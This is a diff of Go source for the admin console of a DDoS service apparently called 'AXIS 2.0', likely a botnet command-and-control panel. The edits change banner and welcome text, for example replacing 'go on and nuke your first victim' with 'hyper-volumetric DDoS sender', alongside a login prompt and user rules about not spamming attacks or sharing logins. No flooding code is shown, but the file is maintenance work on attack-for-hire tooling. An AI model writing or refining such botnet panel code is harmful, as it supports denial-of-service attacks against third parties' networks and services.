@@ -33,8 +33,8 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\x1b[1;32m   ╔═╗═╗ ╦╦╔═╗\r\n"))
 	this.conn.Write([]byte("\x1b[1;35m   ╠═╣╔╩╦╝║╚═╗\r\n"))
 	this.conn.Write([]byte("\x1b[1;32m   ╩ ╩╩ ╚═╩╚═╝\r\n"))
-	this.conn.Write([]byte("\x1b[1;35m  AXIS 2.0 DDoS from AXIS group\r\n"))
-	this.conn.Write([]byte("\x1b[1;32m  go on and nuke your first victim\r\n"))
+	this.conn.Write([]byte("\x1b[1;35m  AXIS 2.0 DDoS from AXIS\r\n"))
+	this.conn.Write([]byte("\x1b[1;32m  hyper-volumetric DDoS sender\r\n"))
 	this.conn.Write([]byte("\x1b[1;35mUsername\x1b[1;35m: \x1b[0m"))
 	username, err := this.ReadLine(false)
 	if err != nil {
@@ -75,7 +75,7 @@ func (this *Admin) Handle() {
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╔═╗\x1b[1;32m═╗ ╦\x1b[1;35m╦\x1b[1;32m╔═╗\x1b[1;35m Distributed\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╠═╣\x1b[1;32m╔╩╦╝\x1b[1;35m║\x1b[1;32m╚═╗\x1b[1;35m Denial\x1b[0m\r\n"))
 	this.conn.Write([]byte("\x1b[0m    \x1b[1;35m╩ ╩\x1b[1;32m╩ ╚═\x1b[1;35m╩\x1b[1;32m╚═╝\x1b[1;35m Of Service\x1b[0m\r\n"))
-	this.conn.Write([]byte("\x1b[90m                  AXIS 2.0 DDoS from AXIS group\r\n"))
+	this.conn.Write([]byte("\x1b[90m                    hyper-volumetric DDoS sender\r\n"))
 
 	// Start window title updater
 	go func() {
@@ -223,7 +223,7 @@ func (this *Admin) Handle() {
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mHey \033[01;37m" + username + "!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont spam attacks! Dont share logins!\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;31mDont attack government targets!\r\n")))
-			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mAXIS 2.0 - Merged Edition\r\n")))
+			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mAXIS 2.0 - Final version\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m  \033[01;37mVersion\033[01;36m:\033[01;37m \033[01;37mv2.0\r\n")))
 			this.conn.Write([]byte(fmt.Sprintf("\033[01;37m\033[01;36m ══════════════┌∩┐(◣_◢)┌∩┐\033[01;36m══════════════\r\n")))
 			continue
